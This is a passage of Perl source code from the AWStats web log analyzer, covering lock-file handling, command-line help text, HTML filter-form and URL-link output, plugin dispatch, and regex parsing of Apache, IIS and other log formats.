1\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\n\t\t# Set lock where we can\n\t\tforeach my $key ( $ENV{\"TEMP\"}, $ENV{\"TMP\"}, \"/tmp\", \"/\", \".\" ) {\n\t\t\tif ( !-d \"$key\" ) { next; }\n\t\t\t$DirLock = $key;\n\t\t\t$DirLock =~ s/[\\\\\\/]$//;\n\t\t\tif ($Debug) { debug(\"Update lock file $DirLock/$lock is set\"); }\n\t\t\topen( LOCK, \">$DirLock/$lock\" )\n\t\t\t  || error( \"Failed to create lock file $DirLock/$lock\", \"\", \"\",\n\t\t\t\t1 );\n\t\t\tprint LOCK\n\"AWStats update started by process $$ at $nowyear-$nowmonth-$nowday $nowhour:$nowmin:$nowsec\\n\";\n\t\t\tclose(LOCK);\n\t\t\tlast;\n\t\t}\n\t}\n\telse {\n\n\t\t# Remove lock\n\t\tif ($Debug) { debug(\"Update lock file $DirLock/$lock is removed\"); }\n\t\tunlink(\"$DirLock/$lock\");\n\t}\n\treturn;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Signal handler to call Lock_Update to remove lock file\n# Parameters:   Signal name\n# Input:        None\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub SigHandler {\n\tmy $signame = shift;\n\tprint ucfirst($PROG) . \" process (ID $$) interrupted by signal $signame.\\n\";\n\t&Lock_Update(0);\n\texit 1;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Convert an IPAddress into an integer\n# Parameters:   IPAddress\n# Input:        None\n# Output:       None\n# Return:       Int\n#------------------------------------------------------------------------------\nsub Convert_IP_To_Decimal {\n\tmy ($IPAddress) = @_;\n\tmy @ip_seg_arr = split( /\\./, $IPAddress );\n\tmy $decimal_ip_address =\n\t  256 * 256 * 256 * $ip_seg_arr[0] + 256 * 256 * $ip_seg_arr[1] + 256 *\n\t  $ip_seg_arr[2] + $ip_seg_arr[3];\n\treturn ($decimal_ip_address);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Test there is at least one value in list not null\n# Parameters:   List of values\n# Input:        None\n# Output:       None\n# Return:       1 There is at least one not null value, 0 else\n#------------------------------------------------------------------------------\nsub AtLeastOneNotNull {\n\tif ($Debug) {\n\t\tdebug( \" Call to AtLeastOneNotNull (\" . join( '-', @_ ) . \")\", 3 );\n\t}\n\tforeach my $val (@_) {\n\t\tif ($val) { return 1; }\n\t}\n\treturn 0;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the command line interface help information\n# Parameters:   None\n# Input:        None\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub PrintCLIHelp{\n\t&Read_Ref_Data(\n\t\t'browsers',       'domains', 'operating_systems', 'robots',\n\t\t'search_engines', 'worms'\n\t);\n\tprint \"----- $PROG $VERSION (c) 2000-2016 Laurent Destailleur -----\\n\";\n\tprint\n\"AWStats is a free web server logfile analyzer to show you advanced web\\n\";\n\tprint \"statistics.\\n\";\n\tprint\n\"AWStats comes with ABSOLUTELY NO WARRANTY. It's a free software distributed\\n\";\n\tprint \"with a GNU General Public License (See LICENSE file for details).\\n\";\n\tprint \"\\n\";\n\tprint \"Syntax: $PROG.$Extension -config=virtualhostname [options]\\n\";\n\tprint \"\\n\";\n\tprint\n\"  This runs $PROG in command line to update statistics (-update option) of a\\n\";\n\tprint\n\"   web site, from the log file defined in AWStats config file, or build a HTML\\n\";\n\tprint \"   report (-output option).\\n\";\n\tprint\n\"  First, $PROG tries to read $PROG.virtualhostname.conf as the config file.\\n\";\n\tprint \"  If not found, $PROG tries to read $PROG.conf, and finally the full path passed to -config=\\n\";\n\tprint\n\"  Note 1: Config files ($PROG.virtualhostname.conf or $PROG.conf) must be\\n\";\n\tprint\n\"   in /etc/awstats, /usr/local/etc/awstats, /etc or same directory than\\n\";\n\tprint \"   awstats.pl script file.\\n\";\n\tprint\n\"  Note 2: If AWSTATS_FORCE_CONFIG environment variable is defined, AWStats will\\n\";\n\tprint\n\"   use it as the \\\"config\\\" value, whatever is the value on command line or URL.\\n\";\n\tprint \"   See AWStats documentation for all setup instrutions.\\n\";\n\tprint \"\\n\";\n\tprint \"Options to update statistics:\\n\";\n\tprint \"  -update        to update statistics (default)\\n\";\n\tprint\n\"  -showsteps     to add benchmark information every $NBOFLINESFORBENCHMARK lines processed\\n\";\n\tprint\n\"  -showcorrupted to add output for each corrupted lines found, with reason\\n\";\n\tprint\n\"  -showdropped   to add output for each dropped lines found, with reason\\n\";\n\tprint \"  -showunknownorigin  to output referer when it can't be parsed\\n\";\n\tprint\n\"  -showdirectorigin   to output log line when origin is a direct access\\n\";\n\tprint \"  -updatefor=n   to stop the update process after parsing n lines\\n\";\n\tprint\n\"  -LogFile=x     to change log to analyze whatever is 'LogFile' in config file\\n\";\n\tprint\n\"  Be care to process log files in chronological order when updating statistics.\\n\";\n\tprint \"\\n\";\n\tprint \"Options to show statistics:\\n\";\n\tprint\n\"  -output      to output main HTML report (no update made except with -update)\\n\";\n\tprint \"  -output=x    to output other report pages where x is:\\n\";\n\tprint\n\"               alldomains       to build page of all domains/countries\\n\";\n\tprint \"               allhosts         to build page of all hosts\\n\";\n\tprint\n\t  \"               lasthosts        to build page of last hits for hosts\\n\";\n\tprint\n\t  \"               unknownip        to build page of all unresolved IP\\n\";\n\tprint\n\"               allemails        to build page of all email senders (maillog)\\n\";\n\tprint\n\"               lastemails       to build page of last email senders (maillog)\\n\";\n\tprint\n\"               allemailr        to build page of all email receivers (maillog)\\n\";\n\tprint\n\"               lastemailr       to build page of last email receivers (maillog)\\n\";\n\tprint \"               alllogins        to build page of all logins used\\n\";\n\tprint\n\t  \"               lastlogins       to build page of last hits for logins\\n\";\n\tprint\n\"               allrobots        to build page of all robots/spider visits\\n\";\n\tprint\n\t  \"               lastrobots       to build page of last hits for robots\\n\";\n\tprint \"               urldetail        to list most often viewed pages \\n\";\n\tprint\n\"               urldetail:filter to list most often viewed pages matching filter\\n\";\n\tprint \"               urlentry         to list entry pages\\n\";\n\tprint\n\t  \"               urlentry:filter  to list entry pages matching filter\\n\";\n\tprint \"               urlexit          to list exit pages\\n\";\n\tprint\n\t  \"               urlexit:filter   to list exit pages matching filter\\n\";\n\tprint\n\"               osdetail         to build page with os detailed versions\\n\";\n\tprint\n\"               browserdetail    to build page with browsers detailed versions\\n\";\n\tprint\n\"               unknownbrowser   to list 'User Agents' with unknown browser\\n\";\n\tprint\n\t  \"               unknownos        to list 'User Agents' with unknown OS\\n\";\n\tprint\n\"               refererse        to build page of all refering search engines\\n\";\n\tprint\n\t  \"               refererpages     to build page of all refering pages\\n\";\n\n #print \"               referersites     to build page of all refering sites\\n\";\n\tprint\n\"               keyphrases       to list all keyphrases used on search engines\\n\";\n\tprint\n\"               keywords         to list all keywords used on search engines\\n\";\n\tprint \"               errors404        to list 'Referers' for 404 errors\\n\";\n\tprint\n\"               allextraX        to build page of all values for ExtraSection X\\n\";\n\tprint \"  -staticlinks           to have static links in HTML report page\\n\";\n\tprint \"  -staticlinksext=xxx    to have static links with .xxx extension instead of .html\\n\";\n\tprint\n\"  -lang=LL     to output a HTML report in language LL (en,de,es,fr,it,nl,...)\\n\";\n\tprint \"  -month=MM    to output a HTML report for an old month MM\\n\";\n\tprint \"  -year=YYYY   to output a HTML report for an old year YYYY\\n\";\n\tprint\n\"  The 'date' options doesn't allow you to process old log file. They only\\n\";\n\tprint\n\"  allow you to see a past report for a chosen month/year period instead of\\n\";\n\tprint \"  current month/year.\\n\";\n\tprint \"\\n\";\n\tprint \"Other options:\\n\";\n\tprint\n\"  -debug=X     to add debug informations lesser than level X (speed reduced)\\n\";\n\tprint\n\"  -version     show AWStats version\\n\";\n\tprint \"\\n\";\n\tprint \"Now supports/detects:\\n\";\n\tprint\n\"  Web/Ftp/Mail/streaming server log analyzis (and load balanced log files)\\n\";\n\tprint \"  Reverse DNS lookup (IPv4 and IPv6) and GeoIP lookup\\n\";\n\tprint \"  Number of visits, number of unique visitors\\n\";\n\tprint \"  Visits duration and list of last visits\\n\";\n\tprint \"  Authenticated users\\n\";\n\tprint \"  Days of week and rush hours\\n\";\n\tprint \"  Hosts list and unresolved IP addresses list\\n\";\n\tprint \"  Most viewed, entry and exit pages\\n\";\n\tprint \"  Files type and Web compression (mod_gzip, mod_deflate stats)\\n\";\n\tprint \"  Screen size\\n\";\n\tprint \"  Ratio of Browsers with support of: Java, Flash, RealG2 reader,\\n\";\n\tprint \"                        Quicktime reader, WMA reader, PDF reader\\n\";\n\tprint \"  Configurable personalized reports\\n\";\n\tprint \"  \" . ( scalar keys %DomainsHashIDLib ) . \" domains/countries\\n\";\n\tprint \"  \" . ( scalar keys %RobotsHashIDLib ) . \" robots\\n\";\n\tprint \"  \" . ( scalar keys %WormsHashLib ) . \" worm's families\\n\";\n\tprint \"  \" . ( scalar keys %OSHashLib ) . \" operating systems\\n\";\n\tprint \"  \" . ( scalar keys %BrowsersHashIDLib ) . \" browsers\";\n\t&Read_Ref_Data('browsers_phone');\n\tprint \" (\"\n\t  . ( scalar keys %BrowsersHashIDLib )\n\t  . \" with phone browsers database)\\n\";\n\tprint \"  \"\n\t  . ( scalar keys %SearchEnginesHashLib )\n\t  . \" search engines (and keyphrases/keywords used from them)\\n\";\n\tprint \"  All HTTP errors with last referrer\\n\";\n\tprint \"  Report by day/month/year\\n\";\n\tprint \"  Dynamic or static HTML or XHTML reports, static PDF reports\\n\";\n\tprint \"  Indexed text or XML monthly database\\n\";\n\tprint \"  And a lot of other advanced features and options...\\n\";\n\tprint \"New versions and FAQ at http://www.awstats.org\\n\";\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return the string to add in html tag to include popup javascript code\n# Parameters:   tooltip number\n# Input:        None\n# Output:       None\n# Return:       string with javascript code\n#------------------------------------------------------------------------------\nsub Tooltip {\n\tmy $ttnb = shift;\n\treturn (\n\t\t$TOOLTIPON\n\t\t? \" onmouseover=\\\"ShowTip($ttnb);\\\" onmouseout=\\\"HideTip($ttnb);\\\"\"\n\t\t: \"\"\n\t);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Insert a form filter\n# Parameters:   Name of filter field, default for filter field, default for exclude filter field\n# Input:        $StaticLinks, $QueryString, $SiteConfig, $DirConfig\n# Output:       HTML Form\n# Return:       None\n#------------------------------------------------------------------------------\nsub HTMLShowFormFilter {\n\tmy $fieldfiltername    = shift;\n\tmy $fieldfilterinvalue = shift;\n\tmy $fieldfilterexvalue = shift;\n\tif ( !$StaticLinks ) {\n\t\tmy $NewLinkParams = ${QueryString};\n\t\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)output(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t\t$NewLinkParams =~ s/^&amp;//;\n\t\t$NewLinkParams =~ s/&amp;$//;\n\t\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\t\tprint \"\\n<form name=\\\"FormFilter\\\" action=\\\"\"\n\t\t  . XMLEncode(\"$AWScript${NewLinkParams}\")\n\t\t  . \"\\\" class=\\\"aws_border\\\">\\n\";\n\t\tprint\n\"<table valign=\\\"middle\\\" width=\\\"99%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"2\\\"><tr>\\n\";\n\t\tprint \"<td align=\\\"left\\\" width=\\\"50\\\">$Message[79]&nbsp;:</td>\\n\";\n\t\tprint\n\"<td align=\\\"left\\\" width=\\\"100\\\"><input type=\\\"text\\\" name=\\\"${fieldfiltername}\\\" value=\\\"$fieldfilterinvalue\\\" class=\\\"aws_formfield\\\" /></td>\\n\";\n\t\tprint \"<td> &nbsp; </td>\";\n\t\tprint \"<td align=\\\"left\\\" width=\\\"100\\\">$Message[153]&nbsp;:</td>\\n\";\n\t\tprint\n\"<td align=\\\"left\\\" width=\\\"100\\\"><input type=\\\"text\\\" name=\\\"${fieldfiltername}ex\\\" value=\\\"$fieldfilterexvalue\\\" class=\\\"aws_formfield\\\" /></td>\\n\";\n\t\tprint \"<td>\";\n\t\tprint \"<input type=\\\"hidden\\\" name=\\\"output\\\" value=\\\"\"\n\t\t  . join( ',', keys %HTMLOutput )\n\t\t  . \"\\\" />\\n\";\n\n\t\tif ($SiteConfig) {\n\t\t\tprint\n\"<input type=\\\"hidden\\\" name=\\\"config\\\" value=\\\"$SiteConfig\\\" />\\n\";\n\t\t}\n\t\tif ($DirConfig) {\n\t\t\tprint\n\"<input type=\\\"hidden\\\" name=\\\"configdir\\\" value=\\\"$DirConfig\\\" />\\n\";\n\t\t}\n\t\tif ( $QueryString =~ /(^|&|&amp;)year=(\\d\\d\\d\\d)/i ) {\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"year\\\" value=\\\"$2\\\" />\\n\";\n\t\t}\n\t\tif (   $QueryString =~ /(^|&|&amp;)month=(\\d\\d)/i\n\t\t\t|| $QueryString =~ /(^|&|&amp;)month=(all)/i )\n\t\t{\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"month\\\" value=\\\"$2\\\" />\\n\";\n\t\t}\n\t\tif ( $QueryString =~ /(^|&|&amp;)lang=(\\w+)/i ) {\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"lang\\\" value=\\\"$2\\\" />\\n\";\n\t\t}\n\t\tif ( $QueryString =~ /(^|&|&amp;)debug=(\\d+)/i ) {\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"debug\\\" value=\\\"$2\\\" />\\n\";\n\t\t}\n\t\tif ( $QueryString =~ /(^|&|&amp;)framename=(\\w+)/i ) {\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"framename\\\" value=\\\"$2\\\" />\\n\";\n\t\t}\n\t\tprint\n\"<input type=\\\"submit\\\" value=\\\" $Message[115] \\\" class=\\\"aws_button\\\" /></td>\\n\";\n\t\tprint \"<td> &nbsp; </td>\";\n\t\tprint \"</tr></table>\\n\";\n\t\tprint \"</form>\\n\";\n\t\tprint \"<br />\\n\";\n\t\tprint \"\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Write other user info (with help of plugin)\n# Parameters:   $user\n# Input:        $SiteConfig\n# Output:       URL link\n# Return:       None\n#------------------------------------------------------------------------------\nsub HTMLShowUserInfo {\n\tmy $user = shift;\n\n\t# Call to plugins' function ShowInfoUser\n\tforeach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoUser'} } ) {\n\n\t\t#\t\tmy $function=\"ShowInfoUser_$pluginname('$user')\";\n\t\t#\t\teval(\"$function\");\n\t\tmy $function = \"ShowInfoUser_$pluginname\";\n\t\t&$function($user);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Write other cluster info (with help of plugin)\n# Parameters:   $clusternb\n# Input:        $SiteConfig\n# Output:       Cluster info\n# Return:       None\n#------------------------------------------------------------------------------\nsub HTMLShowClusterInfo {\n\tmy $cluster = shift;\n\n\t# Call to plugins' function ShowInfoCluster\n\tforeach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoCluster'} } )\n\t{\n\n\t\t#\t\tmy $function=\"ShowInfoCluster_$pluginname('$user')\";\n\t\t#\t\teval(\"$function\");\n\t\tmy $function = \"ShowInfoCluster_$pluginname\";\n\t\t&$function($cluster);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Write other host info (with help of plugin)\n# Parameters:   $host\n# Input:        $LinksToWhoIs $LinksToWhoIsIp\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub HTMLShowHostInfo {\n\tmy $host = shift;\n\n\t# Call to plugins' function ShowInfoHost\n\tforeach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoHost'} } ) {\n\n\t\t#\t\tmy $function=\"ShowInfoHost_$pluginname('$host')\";\n\t\t#\t\teval(\"$function\");\n\t\tmy $function = \"ShowInfoHost_$pluginname\";\n\t\t&$function($host);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Write other url info (with help of plugin)\n# Parameters:   $url\n# Input:        %Aliases $MaxLengthOfShownURL $ShowLinksOnUrl $SiteDomain $UseHTTPSLinkForUrl\n# Output:       URL link\n# Return:       None\n#------------------------------------------------------------------------------\nsub HTMLShowURLInfo {\n\tmy $url     = shift;\n\tmy $nompage = CleanXSS($url);\n\n\t# Call to plugins' function ShowInfoURL\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowInfoURL'} } ) {\n\n\t\t#\t\tmy $function=\"ShowInfoURL_$pluginname('$url')\";\n\t\t#\t\teval(\"$function\");\n\t\tmy $function = \"ShowInfoURL_$pluginname\";\n\t\t&$function($url);\n\t}\n\n\tif ( length($nompage) > $MaxLengthOfShownURL ) {\n\t\t$nompage = substr( $nompage, 0, $MaxLengthOfShownURL ) . \"...\";\n\t}\n\tif ($ShowLinksOnUrl) {\n\t\tmy $newkey = CleanXSS($url);\n\t\tif ( $LogType eq 'W' || $LogType eq 'S' ) {  # Web or streaming log file\n\t\t\tif ( $newkey =~ /^http(s|):/i )\n\t\t\t{    # URL seems to be extracted from a proxy log file\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . XMLEncode(\"$newkey\")\n\t\t\t\t  . \"\\\" target=\\\"url\\\" rel=\\\"nofollow noopener noreferrer\\\">\"\n\t\t\t\t  . XMLEncode($nompage) . \"</a>\";\n\t\t\t}\n\t\t\telsif ( $newkey =~ /^\\// )\n\t\t\t{ # URL seems to be an url extracted from a web or wap server log file\n\t\t\t\t$newkey =~ s/^\\/$SiteDomain//i;\n\n\t\t\t\t# Define urlprot\n\t\t\t\tmy $urlprot = 'http';\n\t\t\t\tif ( $UseHTTPSLinkForUrl && $newkey =~ /^$UseHTTPSLinkForUrl/ )\n\t\t\t\t{\n\t\t\t\t\t$urlprot = 'https';\n\t\t\t\t}\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . XMLEncode(\"$urlprot://$SiteDomain$newkey\")\n\t\t\t\t  . \"\\\" target=\\\"url\\\" rel=\\\"nofollow noopener noreferrer\\\">\"\n\t\t\t\t  . XMLEncode($nompage) . \"</a>\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint XMLEncode($nompage);\n\t\t\t}\n\t\t}\n\t\telsif ( $LogType eq 'F' ) {    # Ftp log file\n\t\t\tprint XMLEncode($nompage);\n\t\t}\n\t\telsif ( $LogType eq 'M' ) {    # Smtp log file\n\t\t\tprint XMLEncode($nompage);\n\t\t}\n\t\telse {                         # Other type log file\n\t\t\tprint XMLEncode($nompage);\n\t\t}\n\t}\n\telse {\n\t\tprint XMLEncode($nompage);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Define value for PerlParsingFormat (used for regex log record parsing)\n# Parameters:   $LogFormat\n# Input:        -\n# Output:       $pos_xxx, @pos_extra, @fieldlib, $PerlParsingFormat\n# Return:       -\n#------------------------------------------------------------------------------\nsub DefinePerlParsingFormat {\n\tmy $LogFormat = shift;\n\t$pos_vh = $pos_host = $pos_logname = $pos_date = $pos_tz = $pos_method =\n\t  $pos_url = $pos_code = $pos_size = -1;\n\t$pos_referer = $pos_agent = $pos_query = $pos_gzipin = $pos_gzipout =\n\t  $pos_compratio   = -1;\n\t$pos_cluster       = $pos_emails = $pos_emailr = $pos_hostr = -1;\n\t@pos_extra         = ();\n\t@fieldlib          = ();\n\t$PerlParsingFormat = '';\n\n# Log records examples:\n# Apache combined:             62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] \"GET / HTTP/1.1\" 200 1234 \"http://www.from.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n# Apache combined (408 error): my.domain.com - user [09/Jan/2001:11:38:51 -0600] \"OPTIONS /mime-tmp/xxx file.doc HTTP/1.1\" 408 - \"-\" \"-\"\n# Apache combined (408 error): 62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] \"-\" 408 - \"-\" \"-\"\n# Apache combined (400 error): 80.8.55.11 - - [28/Apr/2007:03:20:02 +0200] \"GET /\" 400 584 \"-\" \"-\"\n# IIS:                         2000-07-19 14:14:14 62.161.78.73 - GET / 200 1234 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) http://www.from.com/from.htm\n# WebStar:                     05/21/00\t00:17:31\tOK  \t200\t212.242.30.6\tMozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)\thttp://www.cover.dk/\t\"www.cover.dk\"\t:Documentation:graphics:starninelogo.white.gif\t1133\n# Squid extended:              12.229.91.170 - - [27/Jun/2002:03:30:50 -0700] \"GET http://www.callistocms.com/images/printable.gif HTTP/1.1\" 304 354 \"-\" \"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\" TCP_REFRESH_HIT:DIRECT\n# Log formats:\n# Apache common_with_mod_gzip_info1: %h %l %u %t \\\"%r\\\" %>s %b mod_gzip: %{mod_gzip_compression_ratio}npct.\n# Apache common_with_mod_gzip_info2: %h %l %u %t \\\"%r\\\" %>s %b mod_gzip: %{mod_gzip_result}n In:%{mod_gzip_input_size}n Out:%{mod_gzip_output_size}n:%{mod_gzip_compression_ratio}npct.\n# Apache deflate: %h %l %u %t \\\"%r\\\" %>s %b \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\" (%{ratio}n)\n\tif ($Debug) {\n\t\tdebug(\n\"Call To DefinePerlParsingFormat (LogType='$LogType', LogFormat='$LogFormat')\"\n\t\t);\n\t}\n\tif ( $LogFormat =~ /^[1-6]$/ ) {    # Pre-defined log format\n\t\tif ( $LogFormat eq '1' || $LogFormat eq '6' )\n\t\t{ # Same than \"%h %l %u %t \\\"%r\\\" %>s %b \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\"\".\n\t\t\t # %u (user) is \"([^\\\\/\\\\[]+)\" instead of \"[^ ]+\" because can contain space (Lotus Notes). referer and ua might be \"\".\n\n# $PerlParsingFormat=\"([^ ]+) [^ ]+ ([^\\\\/\\\\[]+) \\\\[([^ ]+) [^ ]+\\\\] \\\\\\\"([^ ]+) (.+) [^\\\\\\\"]+\\\\\\\" ([\\\\d|-]+) ([\\\\d|-]+) \\\\\\\"(.*?)\\\\\\\" \\\\\\\"([^\\\\\\\"]*)\\\\\\\"\";\n\t\t\t$PerlParsingFormat =\n\"([^ ]+) [^ ]+ ([^\\\\/\\\\[]+) \\\\[([^ ]+) [^ ]+\\\\] \\\\\\\"([^ ]+) ([^ ]+)(?: [^\\\\\\\"]+|)\\\\\\\" ([\\\\d|-]+) ([\\\\d|-]+) \\\\\\\"(.*?)\\\\\\\" \\\\\\\"([^\\\\\\\"]*)\\\\\\\"\";\n\t\t\t$pos_host    = 0;\n\t\t\t$pos_logname = 1;\n\t\t\t$pos_date    = 2;\n\t\t\t$pos_method  = 3;\n\t\t\t$pos_url     = 4;\n\t\t\t$pos_code    = 5;\n\t\t\t$pos_size    = 6;\n\t\t\t$pos_referer = 7;\n\t\t\t$pos_agent   = 8;\n\t\t\t@fieldlib    = (\n\t\t\t\t'host', 'logname', 'date', 'method', 'url', 'code',\n\t\t\t\t'size', 'referer', 'ua'\n\t\t\t);\n\t\t}\n\t\telsif ( $LogFormat eq '2' )\n\t\t{ # Same than \"date time c-ip cs-username cs-method cs-uri-stem sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)\"\n\t\t\t$PerlParsingFormat =\n\"(\\\\S+ \\\\S+) (\\\\S+) (\\\\S+) (\\\\S+) (\\\\S+) ([\\\\d|-]+) ([\\\\d|-]+) \\\\S+ (\\\\S+) (\\\\S+)\";\n\t\t\t$pos_date    = 0;\n\t\t\t$pos_host    = 1;\n\t\t\t$pos_logname = 2;\n\t\t\t$pos_method  = 3;\n\t\t\t$pos_url     = 4;\n\t\t\t$pos_code    = 5;\n\t\t\t$pos_size    = 6;\n\t\t\t$pos_agent   = 7;\n\t\t\t$pos_referer = 8;\n\t\t\t@fieldlib    = (\n\t\t\t\t'date', 'host', 'logname', 'method', 'url', 'code',\n\t\t\t\t'size', 'ua',   'referer'\n\t\t\t);\n\t\t}\n\t\telsif ( $LogFormat eq '3' ) {\n\t\t\t$PerlParsingFormat =\n\"([^\\\\t]*\\\\t[^\\\\t]*)\\\\t([^\\\\t]*)\\\\t([\\\\d|-]*)\\\\t([^\\\\t]*)\\\\t([^\\\\t]*)\\\\t([^\\\\t]*)\\\\t[^\\\\t]*\\\\t([^\\\\t]*)\\\\t([\\\\d]*)\";\n\t\t\t$pos_date    = 0;\n\t\t\t$pos_method  = 1;\n\t\t\t$pos_code    = 2;\n\t\t\t$pos_host    = 3;\n\t\t\t$pos_agent   = 4;\n\t\t\t$pos_referer = 5;\n\t\t\t$pos_url     = 6;\n\t\t\t$pos_size    = 7;\n\t\t\t@fieldlib    = (\n\t\t\t\t'date', 'method',  'code', 'host',\n\t\t\t\t'ua',   'referer', 'url',  'size'\n\t\t\t);\n\t\t}\n\t\telsif ( $LogFormat eq '4' ) {    # Same than \"%h %l %u %t \\\"%r\\\" %>s %b\"\n\t\t\t# %u (user) is \"(.+)\" instead of \"[^ ]+\" because can contain space (Lotus Notes).\n\t\t\t# Sample: 10.100.10.45 - BMAA\\will.smith [01/Jul/2013:07:17:28 +0200] \"GET /Download/__Omnia__Aus- und Weiterbildung__Konsular- und Verwaltungskonferenz, Programm.doc HTTP/1.1\" 200 9076810\n#\t\t\t$PerlParsingFormat = \n#\"([^ ]+) [^ ]+ (.+) \\\\[([^ ]+) [^ ]+\\\\] \\\\\\\"([^ ]+) ([^ ]+)(?: [^\\\\\\\"]+|)\\\\\\\" ([\\\\d|-]+) ([\\\\d|-]+)\";\n\t\t\t$PerlParsingFormat = \n\"([^ ]+) [^ ]+ (.+) \\\\[([^ ]+) [^ ]+\\\\] \\\\\\\"([^ ]+) (.+) [^\\\\\\\"]+\\\\\\\" ([\\\\d|-]+) ([\\\\d|-]+)\";\n\t\t\t$pos_host    = 0;\n\t\t\t$pos_logname = 1;\n\t\t\t$pos_date    = 2;\n\t\t\t$pos_method  = 3;\n\t\t\t$pos_url     = 4;\n\t\t\t$pos_code    = 5;\n\t\t\t$pos_size    = 6;\n\t\t\t@fieldlib    =\n\t\t\t  ( 'host', 'logname', 'date', 'method', 'url', 'code', 'size' );\n\t\t}\n\t}\n\telse {    # Personalized log format\n\t\tmy $LogFormatString = $LogFormat;\n\n\t\t# Replacement for Notes format string that are not Apache\n\t\t$LogFormatString =~ s/%vh/%virtualname/g;\n\n\t\t# Replacement for Apache format string\n\t\t$LogFormatString =~ s/%v(\\s)/%virtualname$1/g;\n\t\t$LogFormatString =~ s/%v$/%virtualname/g;\n\t\t$LogFormatString =~ s/%h(\\s)/%host$1/g;\n\t\t$LogFormatString =~ s/%h$/%host/g;\n\t\t$LogFormatString =~ s/%l(\\s)/%other$1/g;\n\t\t$LogFormatString =~ s/%l$/%other/g;\n\t\t$LogFormatString =~ s/\\\"%u\\\"/%lognamequot/g;\n\t\t$LogFormatString =~ s/%u(\\s)/%logname$1/g;\n\t\t$LogFormatString =~ s/%u$/%logname/g;\n\t\t$LogFormatString =~ s/%t(\\s)/%time1$1/g;\n\t\t$LogFormatString =~ s/%t$/%time1/g;\n\t\t$LogFormatString =~ s/\\\"%r\\\"/%methodurl/g;\n\t\t$LogFormatString =~ s/%>s/%code/g;\n\t\t$LogFormatString =~ s/%b(\\s)/%bytesd$1/g;\n\t\t$LogFormatString =~ s/%b$/%bytesd/g;\n\t\t$LogFormatString =~ s/\\\"%\\{Referer}i\\\"/%refererquot/g;\n\t\t$LogFormatString =~ s/\\\"%\\{User-Agent}i\\\"/%uaquot/g;\n\t\t$LogFormatString =~ s/%\\{mod_gzip_input_size}n/%gzipin/g;\n\t\t$LogFormatString =~ s/%\\{mod_gzip_output_size}n/%gzipout/g;\n\t\t$LogFormatString =~ s/%\\{mod_gzip_compression_ratio}n/%gzipratio/g;\n\t\t$LogFormatString =~ s/\\(%\\{ratio}n\\)/%deflateratio/g;\n\n\t\t# Replacement for a IIS and ISA format string\n\t\t$LogFormatString =~ s/cs-uri-query/%query/g;    # Must be before cs-uri\n\t\t$LogFormatString =~ s/date\\stime/%time2/g;\n\t\t$LogFormatString =~ s/c-ip/%host/g;\n\t\t$LogFormatString =~ s/cs-username/%logname/g;\n\t\t$LogFormatString =~ s/cs-method/%method/g;  # GET, POST, SMTP, RETR STOR\n\t\t$LogFormatString =~ s/cs-uri-stem/%url/g;\n\t\t$LogFormatString =~ s/cs-uri/%url/g;\n\t\t$LogFormatString =~ s/sc-status/%code/g;\n\t\t$LogFormatString =~ s/sc-bytes/%bytesd/g;\n\t\t$LogFormatString =~ s/cs-version/%other/g;  # Protocol\n\t\t$LogFormatString =~ s/cs\\(User-Agent\\)/%ua/g;\n\t\t$LogFormatString =~ s/c-agent/%ua/g;\n\t\t$LogFormatString =~ s/cs\\(Referer\\)/%referer/g;\n\t\t$LogFormatString =~ s/cs-referred/%referer/g;\n\t\t$LogFormatString =~ s/sc-authenticated/%other/g;\n\t\t$LogFormatString =~ s/s-svcname/%other/g;\n\t\t$LogFormatString =~ s/s-computername/%other/g;\n\t\t$LogFormatString =~ s/r-host/%virtualname/g;\n\t\t$LogFormatString =~ s/cs-host/%virtualname/g;\n\t\t$LogFormatString =~ s/r-ip/%other/g;\n\t\t$LogFormatString =~ s/r-port/%other/g;\n\t\t$LogFormatString =~ s/time-taken/%other/g;\n\t\t$LogFormatString =~ s/cs-bytes/%other/g;\n\t\t$LogFormatString =~ s/cs-protocol/%other/g;\n\t\t$LogFormatString =~ 